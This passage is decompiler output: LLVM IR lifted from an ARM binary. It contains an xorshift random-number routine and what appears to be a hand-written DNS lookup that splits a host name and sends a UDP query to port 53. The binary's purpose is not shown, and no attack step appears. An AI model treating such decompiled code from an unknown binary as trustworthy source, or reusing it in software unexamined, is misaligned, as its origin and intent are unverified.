  %v2_f8b0 = icmp eq i32 %v1_f8a8, 0
  store i1 %v2_f8b0, i1* %cpsr_z.global-to-local, align 1
  %v1_f8b4 = trunc i32 %v2_f8a4.neg to i8
  %v3_f8b4 = inttoptr i32 %v0_f88c to i8*
  store i8 %v1_f8b4, i8* %v3_f8b4, align 1
  %v4_f8b4 = load i32, i32* %r8.global-to-local, align 4
  %v5_f8b4 = add i32 %v4_f8b4, 1
  store i32 %v5_f8b4, i32* %r8.global-to-local, align 4
  %v0_f8b8 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_f8b8, i32* %r0.global-to-local, align 4
  %v0_f8bc = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_f8bc = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_f8bc = load i1, i1* %cpsr_v.global-to-local, align 1
  %v3_f8bc = xor i1 %v1_f8bc, %v2_f8bc
  %v4_f8bc = or i1 %v0_f8bc, %v3_f8bc
  br i1 %v4_f8bc, label %dec_label_pc_f8c0, label %dec_label_pc_f86c

dec_label_pc_f8c0:                                ; preds = %dec_label_pc_f894, %dec_label_pc_f810
  store i32 ptrtoint (i32* @global_var_21324.163 to i32), i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21320.161 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2131c.157 to i32), i32* %r1.global-to-local, align 4
  %v0_f8cc = load i32, i32* %r4.global-to-local, align 4
  %v1_f8cc = load i32, i32* %fp.global-to-local, align 4
  %v2_f8cc = inttoptr i32 %v1_f8cc to i32*
  store i32 %v0_f8cc, i32* %v2_f8cc, align 4
  %v0_f8d0 = load i32, i32* %r5.global-to-local, align 4
  %v1_f8d0 = load i32, i32* %r2.global-to-local, align 4
  %v2_f8d0 = inttoptr i32 %v1_f8d0 to i32*
  store i32 %v0_f8d0, i32* %v2_f8d0, align 4
  %v0_f8d4 = load i32, i32* %sb.global-to-local, align 4
  %v1_f8d4 = load i32, i32* %r3.global-to-local, align 4
  %v2_f8d4 = inttoptr i32 %v1_f8d4 to i32*
  store i32 %v0_f8d4, i32* %v2_f8d4, align 4
  %v0_f8d8 = load i32, i32* %sl.global-to-local, align 4
  %v1_f8d8 = load i32, i32* %r1.global-to-local, align 4
  %v2_f8d8 = inttoptr i32 %v1_f8d8 to i32*
  store i32 %v0_f8d8, i32* %v2_f8d8, align 4
  %v1_f8e4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f8dc

dec_label_pc_f8dc:                                ; preds = %dec_label_pc_f7c4, %dec_label_pc_f8c0
  %v1_f8e4 = phi i32 [ %v0_f7e0, %dec_label_pc_f7c4 ], [ %v1_f8e4.pre, %dec_label_pc_f8c0 ]
  ret i32 %v1_f8e4

; uselistorder directives
  uselistorder i32 %v0_f8b8, { 1, 0 }
  uselistorder i32 %v2_f8a4.neg, { 1, 0 }
  uselistorder i32 %v0_f88c, { 1, 2, 0 }
  uselistorder i32 %v5_f888, { 0, 5, 4, 2, 3, 1 }
  uselistorder i32 %v0_f878, { 2, 1, 0 }
  uselistorder i32 %v0_f87c, { 1, 0 }
  uselistorder i32 %v0_f8a8, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v2_f814, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_f7e4, { 0, 1, 3, 2 }
  uselistorder i32* %sl.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 5, 1, 3, 4, 6 }
  uselistorder i32* %r6.global-to-local, { 4, 0, 1, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r4.global-to-local, { 0, 3, 1, 2 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 8, 2, 3, 4, 5, 6, 7, 9 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 2, 4, 5, 6, 7, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i1* %cpsr_v.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i1* %cpsr_n.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder label %dec_label_pc_f8dc, { 1, 0 }
  uselistorder label %dec_label_pc_f878, { 1, 0 }
  uselistorder label %dec_label_pc_f86c, { 1, 0 }
}

define i32 @function_f900(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_f900:
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_f900 = load i32, i32* %r1.global-to-local, align 4
  %v3_f904 = load i32, i32* @r4, align 4
  store i32 %v3_f904, i32* %stack_var_-28, align 4
  %v0_f908 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_f908, i32* %r5.global-to-local, align 4
  %tmp16 = icmp slt i32 %v0_f900, 1
  br i1 %tmp16, label %dec_label_pc_f9b0, label %dec_label_pc_f910

dec_label_pc_f910:                                ; preds = %dec_label_pc_f900
  store i32 ptrtoint (i32* @global_var_21328.159 to i32), i32* %sl.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21324.163 to i32), i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21320.161 to i32), i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2131c.157 to i32), i32* %r6.global-to-local, align 4
  %v2_f920 = load i32, i32* @global_var_21328.159, align 4
  store i32 %v2_f920, i32* %lr.global-to-local, align 4
  %v2_f924 = load i32, i32* @global_var_21324.163, align 4
  store i32 %v2_f924, i32* %r4.global-to-local, align 4
  %v2_f928 = load i32, i32* @global_var_21320.161, align 4
  store i32 %v2_f928, i32* %r0.global-to-local, align 4
  %v2_f92c = load i32, i32* @global_var_2131c.157, align 4
  br label %dec_label_pc_f950

dec_label_pc_f934:                                ; preds = %dec_label_pc_f970
  %v1_f934 = trunc i32 %v5_f960 to i16
  %v3_f934 = inttoptr i32 %v9_f964 to i16*
  store i16 %v1_f934, i16* %v3_f934, align 2
  %v4_f934 = load i32, i32* %r5.global-to-local, align 4
  %v5_f934 = add i32 %v4_f934, -2
  store i32 %v5_f934, i32* %r5.global-to-local, align 4
  %v0_f938.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_f938

dec_label_pc_f938:                                ; preds = %.thread, %dec_label_pc_f934
  %v0_f938 = phi i32 [ %v9_f968, %.thread ], [ %v0_f938.pre, %dec_label_pc_f934 ]
  %v2_f9345 = phi i32 [ %v12_f964, %.thread ], [ %v5_f934, %dec_label_pc_f934 ]
  %tmp17 = icmp slt i32 %v0_f938, 1
  br i1 %tmp17, label %dec_label_pc_f9b8, label %dec_label_pc_f944

dec_label_pc_f944:                                ; preds = %dec_label_pc_f938
  %v0_f93c = load i32, i32* %r0.global-to-local, align 4
  %v0_f944 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_f944, i32* %r0.global-to-local, align 4
  %v0_f948 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v0_f948, i32* %r4.global-to-local, align 4
  %v0_f94c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_f94c, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_f950

dec_label_pc_f950:                                ; preds = %dec_label_pc_f910, %dec_label_pc_f944
  %v0_f99c = phi i32 [ %v2_f928, %dec_label_pc_f910 ], [ %v0_f944, %dec_label_pc_f944 ]
  %v9_f964 = phi i32 [ %v0_f908, %dec_label_pc_f910 ], [ %v2_f9345, %dec_label_pc_f944 ]
  %v0_f97c = phi i32 [ %v0_f900, %dec_label_pc_f910 ], [ %v0_f938, %dec_label_pc_f944 ]
  %v0_f990 = phi i32 [ %v2_f920, %dec_label_pc_f910 ], [ %v0_f94c, %dec_label_pc_f944 ]
  %v0_f98c = phi i32 [ %v2_f92c, %dec_label_pc_f910 ], [ %v0_f93c, %dec_label_pc_f944 ]
  %v4_f950 = mul i32 %v0_f98c, 2048
  %v5_f950 = xor i32 %v4_f950, %v0_f98c
  %v4_f954 = udiv i32 %v0_f990, 524288
  %v5_f954 = xor i32 %v4_f954, %v0_f990
  %v2_f958 = xor i32 %v5_f954, %v5_f950
  %v4_f960 = udiv i32 %v5_f950, 256
  %v5_f960 = xor i32 %v2_f958, %v4_f960
  store i32 %v5_f960, i32* %r3.global-to-local, align 4
  %v7_f964 = icmp sgt i32 %v0_f97c, 3
  br i1 %v7_f964, label %.thread, label %dec_label_pc_f970

.thread:                                          ; preds = %dec_label_pc_f950
  %v10_f964 = inttoptr i32 %v9_f964 to i32*
  store i32 %v5_f960, i32* %v10_f964, align 4
  %v11_f964 = load i32, i32* %r5.global-to-local, align 4
  %v12_f964 = add i32 %v11_f964, 4
  store i32 %v12_f964, i32* %r5.global-to-local, align 4
  %v8_f968 = load i32, i32* %r1.global-to-local, align 4
  %v9_f968 = add i32 %v8_f968, -4
  store i32 %v9_f968, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_f938

dec_label_pc_f970:                                ; preds = %dec_label_pc_f950
  %v7_f97c = icmp eq i32 %v0_f97c, 1
  store i32 %v5_f960, i32* %r3.global-to-local, align 4
  %v1_f984 = add i32 %v0_f97c, -2
  store i32 %v1_f984, i32* %r1.global-to-local, align 4
  br i1 %v7_f97c, label %dec_label_pc_f98c, label %dec_label_pc_f934

dec_label_pc_f98c:                                ; preds = %dec_label_pc_f970
  store i32 %v5_f960, i32* %r3.global-to-local, align 4
  %v1_f99c = load i32, i32* %r6.global-to-local, align 4
  %v2_f99c = inttoptr i32 %v1_f99c to i32*
  store i32 %v0_f99c, i32* %v2_f99c, align 4
  %v0_f9a0 = load i32, i32* %r4.global-to-local, align 4
  %v1_f9a0 = load i32, i32* %r7.global-to-local, align 4
  %v2_f9a0 = inttoptr i32 %v1_f9a0 to i32*
  store i32 %v0_f9a0, i32* %v2_f9a0, align 4
  %v0_f9a4 = load i32, i32* %lr.global-to-local, align 4
  %v1_f9a4 = load i32, i32* %r8.global-to-local, align 4
  %v2_f9a4 = inttoptr i32 %v1_f9a4 to i32*
  store i32 %v0_f9a4, i32* %v2_f9a4, align 4
  %v0_f9a8 = load i32, i32* %r3.global-to-local, align 4
  %v1_f9a8 = load i32, i32* %sl.global-to-local, align 4
  %v2_f9a8 = inttoptr i32 %v1_f9a8 to i32*
  store i32 %v0_f9a8, i32* %v2_f9a8, align 4
  %v0_f9ac = load i32, i32* %r3.global-to-local, align 4
  %v1_f9ac = trunc i32 %v0_f9ac to i8
  %v2_f9ac = load i32, i32* %r5.global-to-local, align 4
  %v3_f9ac = inttoptr i32 %v2_f9ac to i8*
  store i8 %v1_f9ac, i8* %v3_f9ac, align 1
  br label %dec_label_pc_f9b0

dec_label_pc_f9b0:                                ; preds = %dec_label_pc_f900, %dec_label_pc_f9b8, %dec_label_pc_f98c
  %v2_f9b0 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_f9b0, i32* @r4, align 4
  %v1_f9b4 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_f9b4

dec_label_pc_f9b8:                                ; preds = %dec_label_pc_f938
  %v0_f9b8 = load i32, i32* %r3.global-to-local, align 4
  %v1_f9b8 = load i32, i32* %sl.global-to-local, align 4
  %v2_f9b8 = inttoptr i32 %v1_f9b8 to i32*
  store i32 %v0_f9b8, i32* %v2_f9b8, align 4
  %v0_f9bc = load i32, i32* %lr.global-to-local, align 4
  %v1_f9bc = load i32, i32* %r8.global-to-local, align 4
  %v2_f9bc = inttoptr i32 %v1_f9bc to i32*
  store i32 %v0_f9bc, i32* %v2_f9bc, align 4
  %v0_f9c0 = load i32, i32* %r4.global-to-local, align 4
  %v1_f9c0 = load i32, i32* %r7.global-to-local, align 4
  %v2_f9c0 = inttoptr i32 %v1_f9c0 to i32*
  store i32 %v0_f9c0, i32* %v2_f9c0, align 4
  %v0_f9c4 = load i32, i32* %r0.global-to-local, align 4
  %v1_f9c4 = load i32, i32* %r6.global-to-local, align 4
  %v2_f9c4 = inttoptr i32 %v1_f9c4 to i32*
  store i32 %v0_f9c4, i32* %v2_f9c4, align 4
  br label %dec_label_pc_f9b0

; uselistorder directives
  uselistorder i32 %v9_f968, { 1, 0 }
  uselistorder i32 %v12_f964, { 1, 0 }
  uselistorder i32 %v5_f960, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v0_f98c, { 1, 0 }
  uselistorder i32 %v0_f990, { 1, 0 }
  uselistorder i32 %v0_f97c, { 1, 0, 2 }
  uselistorder i32 %v0_f938, { 1, 0 }
  uselistorder i32 %v0_f900, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 4, 0, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 5, 0, 1, 2, 3, 6, 4 }
  uselistorder i32* %r1.global-to-local, { 3, 5, 4, 2, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 4, 3, 2, 5, 6, 0, 1 }
  uselistorder i32* %lr.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* @global_var_2131c.157, { 2, 3, 5, 1, 0, 4 }
  uselistorder i32* @global_var_21320.161, { 2, 3, 6, 4, 1, 0, 5 }
  uselistorder i32* @global_var_21324.163, { 2, 3, 5, 1, 0, 4 }
  uselistorder i32* @global_var_21328.159, { 2, 3, 5, 1, 0, 4 }
  uselistorder label %dec_label_pc_f9b0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_f950, { 1, 0 }
}

define i32 @function_f9dc(i32 %arg1) local_unnamed_addr {
dec_label_pc_f9dc:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f9dc = load i32, i32* @r4, align 4
  store i32 %v3_f9dc, i32* %stack_var_-8, align 4
  %v6_f9dc = load i32, i32* @lr, align 4
  %v0_f9e0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_f9e0, i32* @r4, align 4
  %v2_f9e0 = icmp eq i32 %v0_f9e0, 0
  br i1 %v2_f9e0, label %dec_label_pc_f9fc, label %dec_label_pc_f9e8

dec_label_pc_f9e8:                                ; preds = %dec_label_pc_f9dc
  %v1_f9e8 = add i32 %v0_f9e0, 4
  %v2_f9e8 = inttoptr i32 %v1_f9e8 to i32*
  %v3_f9e8 = load i32, i32* %v2_f9e8, align 4
  store i32 %v3_f9e8, i32* %r0.global-to-local, align 4
  store i32 63988, i32* @lr, align 4
  %v1_f9f0 = icmp ne i32 %v3_f9e8, 0
  call void @__pseudo_cond_branch(i1 %v1_f9f0, i32 ptrtoint (i32* @global_var_14bf4.55 to i32))
  %v0_f9f4 = load i32, i32* @r4, align 4
  store i32 %v0_f9f4, i32* @r0, align 4
  %v0_f9f8 = call i32 @function_14bf4()
  store i32 %v0_f9f8, i32* %r0.global-to-local, align 4
  %v2_f9fc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_f9fc

dec_label_pc_f9fc:                                ; preds = %dec_label_pc_f9dc, %dec_label_pc_f9e8
  %v1_fa00 = phi i32 [ 0, %dec_label_pc_f9dc ], [ %v0_f9f8, %dec_label_pc_f9e8 ]
  %v2_f9fc = phi i32 [ %v3_f9dc, %dec_label_pc_f9dc ], [ %v2_f9fc.pre, %dec_label_pc_f9e8 ]
  store i32 %v2_f9fc, i32* @r4, align 4
  store i32 %v6_f9dc, i32* @lr, align 4
  ret i32 %v1_fa00

; uselistorder directives
  uselistorder i32 %v0_f9e0, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_f9fc, { 1, 0 }
}

define i32 @function_fa04(i32 %arg1) local_unnamed_addr {
dec_label_pc_fa04:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp79 = call i16 @__decompiler_undefined_function_1()
  %stack_var_-4280 = alloca i32, align 4
  %stack_var_-4292 = alloca i16, align 2
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-2230 = alloca i32, align 4
  %stack_var_-2244 = alloca i16, align 2
  %stack_var_-2232 = alloca i32, align 4
  %v3_fa04 = load i32, i32* @r4, align 4
  %v9_fa04 = load i32, i32* @r6, align 4
  %v12_fa04 = load i32, i32* @r7, align 4
  %v15_fa04 = load i32, i32* @r8, align 4
  %v18_fa04 = load i32, i32* @sb, align 4
  %v21_fa04 = load i32, i32* @sl, align 4
  %v24_fa04 = load i32, i32* @fp, align 4
  %v27_fa04 = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_fa1c = call i32 @function_144a8(i32 1, i32 8)
  store i32 %v2_fa1c, i32* @fp, align 4
  %v0_fa24 = load i32, i32* @r5, align 4
  store i32 %v0_fa24, i32* %r0.global-to-local, align 4
  %v1_fa28 = inttoptr i32 %v0_fa24 to i8*
  %v2_fa28 = call i32 @function_12480(i8* %v1_fa28)
  %v2_fa30 = ptrtoint i16* %stack_var_-2244 to i32
  store i32 %v2_fa30, i32* @sl, align 4
  %v2_fa34 = ptrtoint i32* %stack_var_-2232 to i32
  store i32 %v2_fa34, i32* @sb, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_fa3c = add i32 %v2_fa28, 1
  store i32 %v1_fa3c, i32* %r0.global-to-local, align 4
  %v2_fa40 = ptrtoint i32* %stack_var_-2230 to i32
  store i32 %v2_fa40, i32* %r2.global-to-local, align 4
  store i32 %v2_fa34, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 %v1_fa3c, i32* %r3.global-to-local, align 4
  %v2_fa7c146 = icmp eq i32 %v1_fa3c, 0
  store i1 %v2_fa7c146, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* @lr, align 4
  %v1_fa84147 = add i32 %v2_fa40, -1
  store i32 %v1_fa84147, i32* %r1.global-to-local, align 4
  %tmp116148 = icmp slt i32 %v1_fa3c, 1
  br i1 %tmp116148, label %dec_label_pc_fa8c, label %dec_label_pc_fa50

dec_label_pc_fa50:                                ; preds = %dec_label_pc_fa04, %bb115
  %v0_fa50151 = phi i32 [ %v1_fa70, %bb115 ], [ 0, %dec_label_pc_fa04 ]
  %v1_fa5c150.off0 = phi i8 [ %extract.t152, %bb115 ], [ 0, %dec_label_pc_fa04 ]
  %v2_fa90149 = phi i32 [ %v1_fa74, %bb115 ], [ %v2_fa40, %dec_label_pc_fa04 ]
  %v1_fa50 = load i32, i32* @r5, align 4
  %v2_fa50 = add i32 %v1_fa50, %v0_fa50151
  %v3_fa50 = inttoptr i32 %v2_fa50 to i8*
  %v4_fa50 = load i8, i8* %v3_fa50, align 1
  %v6_fa50 = zext i8 %v4_fa50 to i32
  store i32 %v6_fa50, i32* %r3.global-to-local, align 4
  %v2_fa54 = icmp eq i8 %v4_fa50, 0
  store i1 %v2_fa54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fa54, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_fa50
  %v8_fa58 = icmp eq i8 %v4_fa50, 46
  store i1 %v8_fa58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fa58, label %.thread, label %.thread7

.thread:                                          ; preds = %dec_label_pc_fa50, %bb
  %v3_fa5c = load i32, i32* %r6.global-to-local, align 4
  %v4_fa5c = inttoptr i32 %v3_fa5c to i8*
  store i8 %v1_fa5c150.off0, i8* %v4_fa5c, align 1
  %v0_fa60.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_fa60.pr, label %.thread9.thread13, label %.thread..thread7_crit_edge

.thread..thread7_crit_edge:                       ; preds = %.thread
  %v1_fa60.pre = load i32, i32* %r3.global-to-local, align 4
  %v3_fa60.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t = trunc i32 %v1_fa60.pre to i8
  br label %.thread7

.thread7:                                         ; preds = %.thread..thread7_crit_edge, %bb
  %v3_fa60 = phi i32 [ %v3_fa60.pre, %.thread..thread7_crit_edge ], [ %v2_fa90149, %bb ]
  %v1_fa60.off0 = phi i8 [ %extract.t, %.thread..thread7_crit_edge ], [ %v4_fa50, %bb ]
  %v4_fa60 = add i32 %v3_fa60, -1
  %v5_fa60 = inttoptr i32 %v4_fa60 to i8*
  store i8 %v1_fa60.off0, i8* %v5_fa60, align 1
  %v0_fa64.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_fa64.pr, label %.thread9, label %.thread12

.thread9.thread13:                                ; preds = %.thread
  %v1_fa64 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v1_fa64, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %bb115

.thread9:                                         ; preds = %.thread7
  %v1_fa6411 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v1_fa6411, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %bb115

.thread12:                                        ; preds = %.thread7
  %v1_fa6c = load i32, i32* @lr, align 4
  %v2_fa6c = urem i32 %v1_fa6c, 256
  store i32 %v2_fa6c, i32* %r4.global-to-local, align 4
  br label %bb115

bb115:                                            ; preds = %.thread9, %.thread9.thread13, %.thread12
  %v0_fa8033 = phi i32 [ 0, %.thread9.thread13 ], [ 0, %.thread9 ], [ %v2_fa6c, %.thread12 ]
  %v0_fa70 = load i32, i32* %ip.global-to-local, align 4
  %v1_fa70 = add i32 %v0_fa70, 1
  store i32 %v1_fa70, i32* %ip.global-to-local, align 4
  %v0_fa74 = load i32, i32* %r2.global-to-local, align 4
  %v1_fa74 = add i32 %v0_fa74, 1
  store i32 %v1_fa74, i32* %r2.global-to-local, align 4
  %v1_fa78.pre = load i32, i32* %r0.global-to-local, align 4
  %v2_fa78 = sub i32 %v1_fa78.pre, %v1_fa70
  store i32 %v2_fa78, i32* %r3.global-to-local, align 4
  %v2_fa7c = icmp eq i32 %v2_fa78, 0
  store i1 %v2_fa7c, i1* %cpsr_z.global-to-local, align 1
  %v1_fa80 = add nuw nsw i32 %v0_fa8033, 1
  store i32 %v1_fa80, i32* @lr, align 4
  store i32 %v0_fa74, i32* %r1.global-to-local, align 4
  %tmp116 = icmp slt i32 %v2_fa78, 1
  %extract.t152 = trunc i32 %v0_fa8033 to i8
  br i1 %tmp116, label %dec_label_pc_fa8c, label %dec_label_pc_fa50

dec_label_pc_fa8c:                                ; preds = %bb115, %dec_label_pc_fa04
  %v1_fa84.lcssa = phi i32 [ %v1_fa84147, %dec_label_pc_fa04 ], [ %v0_fa74, %bb115 ]
  store i32 0, i32* @r4, align 4
  %v4_fa90 = inttoptr i32 %v1_fa84.lcssa to i8*
  store i8 0, i8* %v4_fa90, align 1
  store i32 %v2_fa34, i32* %r0.global-to-local, align 4
  %v1_fa98 = bitcast i32* %stack_var_-2232 to i8*
  %v2_fa98 = call i32 @function_12480(i8* %v1_fa98)
  %v2_fa9c = ptrtoint i32* %stack_var_-216 to i32
  store i32 %v2_fa9c, i32* %r1.global-to-local, align 4
  %v1_faa0 = load i32, i32* @sb, align 4
  %v2_faa0 = add i32 %v1_faa0, %v2_fa98
  store i32 %v2_faa0, i32* @r5, align 4
  %v0_faa8 = load i32, i32* @r4, align 4
  store i32 %v0_faa8, i32* %stack_var_-68, align 4
  store i32 %v2_fa34, i32* %r0.global-to-local, align 4
  %v2_fab8 = call i32 @function_12480(i8* %v1_fa98)
  %v1_fabc = add i32 %v2_fab8, 17
  store i32 %v1_fabc, i32* %r0.global-to-local, align 4
  %v0_fac4 = call i32 @function_f700()
  %v1_fac4 = sext i32 %v0_fac4 to i64
  store i32 -2147450879, i32* %r3.global-to-local, align 4
  %v5_fad0 = mul nuw nsw i64 %v1_fac4, 2147516417
  %v6_fad0 = udiv i64 %v5_fad0, 4294967296
  %v7_fad0 = trunc i64 %v6_fad0 to i32
  %v8_fad0 = trunc i64 %v5_fad0 to i32
  store i32 %v8_fad0, i32* @lr, align 4
  store i32 %v7_fad0, i32* %r2.global-to-local, align 4
  %v5_fad44 = udiv i64 %v5_fad0, 140737488355328
  %v5_fad4 = trunc i64 %v5_fad44 to i32
  %v6_fad4 = add i32 %v5_fad4, %v0_fac4
  store i32 16, i32* %r1.global-to-local, align 4
  %v6_fae0 = urem i32 %v6_fad4, 65536
  store i32 %v6_fae0, i32* %ip.global-to-local, align 4
  %v2_fae8 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_fae8, i32* %r0.global-to-local, align 4
  %v5_faec = trunc i32 %v6_fad4 to i16
  %v2_faf0 = call i32 @function_12514(i32 %v2_fae8, i32 16)
  store i32 %v2_faf0, i32* %r0.global-to-local, align 4
  store i32 13568, i32* %ip.global-to-local, align 4
  store i32 2, i32* %stack_var_-68, align 4
  store i32 256, i32* %r3.global-to-local, align 4
  %v0_fb20 = load i32, i32* @r5, align 4
  %v1_fb20 = add i32 %v0_fb20, 1
  store i32 %v1_fb20, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i16 %v5_faec, i16* %stack_var_-2244, align 2
  %v4_fb34 = inttoptr i32 %v1_fb20 to i16*
  store i16 256, i16* %v4_fb34, align 2
  %v0_fb38 = load i32, i32* %r3.global-to-local, align 4
  %v1_fb38 = trunc i32 %v0_fb38 to i16
  %v2_fb38 = load i32, i32* %r2.global-to-local, align 4
  %v3_fb38 = add i32 %v2_fb38, 2
  %v4_fb38 = inttoptr i32 %v3_fb38 to i16*
  store i16 %v1_fb38, i16* %v4_fb38, align 2
  store i32 -1, i32* %r6.global-to-local, align 4
  %v2_fbd0 = ptrtoint i32* %stack_var_-196 to i32
  %v2_fbf8 = ptrtoint i32* %stack_var_-40 to i32
  %v2_fc24 = ptrtoint i32* %stack_var_-52 to i32
  %v2_fc68 = ptrtoint i16* %stack_var_-4292 to i32
  %v2_fcfc = ptrtoint i32* %stack_var_-4280 to i32
  %v1_fd04 = bitcast i32* %stack_var_-4280 to i8*
  %v4_fd28 = zext i16 %tmp79 to i32
  %v2_fd2c = icmp eq i16 %tmp79, 0
  br label %dec_label_pc_fb44

dec_label_pc_fb44:                                ; preds = %dec_label_pc_fcb0, %dec_label_pc_fa8c
  %v1_fb48 = phi i32 [ -1, %dec_label_pc_fa8c ], [ %v0_fb44.pre, %dec_label_pc_fcb0 ]
  %storemerge = phi i32 [ 1, %dec_label_pc_fa8c ], [ %v1_fcb0, %dec_label_pc_fcb0 ]
  store i32 %storemerge, i32* @r8, align 4
  %v7_fb44 = icmp eq i32 %v1_fb48, -1
  store i1 %v7_fb44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb44, label %bb118, label %bb117

bb117:                                            ; preds = %dec_label_pc_fb44
  store i32 %v1_fb48, i32* %r0.global-to-local, align 4
  br label %bb118

bb118:                                            ; preds = %dec_label_pc_fb44, %bb117
  store i32 64336, i32* @lr, align 4
  %v1_fb4c = xor i1 %v7_fb44, true
  call void @__pseudo_cond_branch(i1 %v1_fb4c, i32 ptrtoint (i32* @global_var_1314c.22 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_fb5c = call i32 @function_13940(i32 2, i32 2, i32 0)
  store i32 %v3_fb5c, i32* %r0.global-to-local, align 4
  %v7_fb60 = icmp eq i32 %v3_fb5c, -1
  store i1 %v7_fb60, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_fb5c, i32* @r6, align 4
  br i1 %v7_fb60, label %dec_label_pc_fcf0, label %dec_label_pc_fb6c

dec_label_pc_fb6c:                                ; preds = %bb118
  store i32 %v2_fae8, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_fb78 = call i32 @function_13728(i32 %v3_fb5c, i32 %v2_fae8, i32 16)
  store i32 %v3_fb78, i32* %r0.global-to-local, align 4
  %v7_fb7c = icmp eq i32 %v3_fb78, -1
  store i1 %v7_fb7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb7c, label %dec_label_pc_fcb8, label %dec_label_pc_fb84

dec_label_pc_fb84:                                ; preds = %dec_label_pc_fb6c
  %v0_fb84 = load i32, i32* @r6, align 4
  store i32 %v0_fb84, i32* %r0.global-to-local, align 4
  store i32 %v2_fa30, i32* %r1.global-to-local, align 4
  store i32 %v1_fabc, i32* %r2.global-to-local, align 4
